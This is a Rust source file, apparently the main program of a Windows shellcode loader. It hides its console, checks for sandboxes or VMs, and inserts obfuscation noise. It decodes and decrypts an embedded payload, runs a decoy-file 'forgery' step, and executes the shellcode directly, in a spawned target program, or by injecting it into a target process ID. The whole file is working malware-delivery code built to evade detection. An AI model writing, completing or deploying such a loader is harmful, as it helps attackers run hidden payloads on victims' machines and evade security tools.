#![windows_subsystem = "windows"]
mod forgery;
mod guard;
mod utils;
use utils::obfuscation_noise;
mod exec;
mod decrypt;
mod alloc_mem;

#[cfg(any(feature = "pattern2", feature = "pattern3"))]
mod target;

use rustcrypt_ct_macros::obf_lit;
use decrypt::decrypt;
use exec::exec;
use std::process;

const ENCRYPT_DATA: &'static [u8] = include_bytes!("encrypt.bin");

#[cfg(feature = "base32_decode")]
#[allow(dead_code)]
fn base32_decode_payload() -> Option<Vec<u8>> {
    // Decode base32 from the embedded constant
    let raw = std::str::from_utf8(ENCRYPT_DATA).ok()?;
    base32::decode(base32::Alphabet::Rfc4648 { padding: true }, raw)
}

#[cfg(feature = "base64_decode")]
#[allow(dead_code)]
fn base64_decode_payload() -> Option<Vec<u8>> {
    // Decode base64 from the embedded constant
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.decode(ENCRYPT_DATA).ok()
}

#[cfg(feature = "urlsafe_base64_decode")]
#[allow(dead_code)]
fn urlsafe_base64_decode_payload() -> Option<Vec<u8>> {
    // Decode urlsafe base64 from the embedded constant
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE.decode(ENCRYPT_DATA).ok()
}

#[cfg(feature = "hex_decode")]
#[allow(dead_code)]
fn hex_decode_payload() -> Option<Vec<u8>> {
    // Decode hex from the embedded constant
    let raw = std::str::from_utf8(ENCRYPT_DATA).ok()?;
    hex::decode(raw.trim()).ok()
}

fn main() {
    #[cfg(feature = "sandbox")]
    guard::guard_vm();

    obfuscation_noise();

    #[cfg(feature = "with_forgery")]
    forgery::bundle::bundlefile();


    #[cfg(feature = "base64_decode")]
    let decrypted_data = base64_decode_payload().unwrap();

    #[cfg(feature = "urlsafe_base64_decode")]
    let decrypted_data = urlsafe_base64_decode_payload().unwrap();

    #[cfg(feature = "base32_decode")]
    let decrypted_data = base32_decode_payload().unwrap();

    #[cfg(feature = "hex_decode")]
    let decrypted_data = hex_decode_payload().unwrap();

    #[cfg(feature = "none_decode")]
    let decrypted_data = ENCRYPT_DATA.to_vec();

    obfuscation_noise();

    unsafe {
        let (shellcode_ptr, _shellcode_len) = match decrypt(&decrypted_data) {
            Ok(p) => p,
            Err(e) => {
                println!("{} {}", obf_lit!("Failed to decrypt:"), e);
                process::exit(1);
            }
        };
        
        obfuscation_noise();

        #[cfg(feature = "pattern1")]
        if let Err(e) = exec(shellcode_ptr) {
            println!("{} {}", obf_lit!("Failed to execute:"), e);
            process::exit(1);
        }
        
        #[cfg(feature = "pattern2")] 
        {
            let target_program = String::from_utf8(target::TARGET_PROGRAM.clone()).unwrap();
            if let Err(e) = exec(shellcode_ptr, _shellcode_len, &target_program) {
                println!("{} {}", obf_lit!("Failed to execute:"), e);
                process::exit(1);
            }
        }
        
        #[cfg(feature = "pattern3")]
        {
            let pid = target::TARGET_PID;
            if let Err(e) = exec(shellcode_ptr, _shellcode_len, pid as usize) {
                println!("{} {}", obf_lit!("Failed to execute:"), e);
                process::exit(1);
            }
        }
        
    }
}